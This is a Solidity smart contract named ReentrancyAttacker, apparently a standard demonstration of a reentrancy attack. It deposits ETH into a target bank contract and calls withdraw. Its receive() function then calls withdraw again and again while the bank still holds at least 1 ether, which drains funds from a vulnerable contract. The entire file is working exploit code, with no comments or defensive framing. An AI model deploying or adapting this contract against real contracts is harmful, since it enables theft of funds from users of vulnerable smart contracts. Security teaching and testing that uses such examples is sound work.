// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IBank {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttacker {
    IBank public bank;

    constructor(address _bank) {
        bank = IBank(_bank);
    }

    function attack() external payable {
        require(msg.value > 0, "Send ETH");

        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }
}
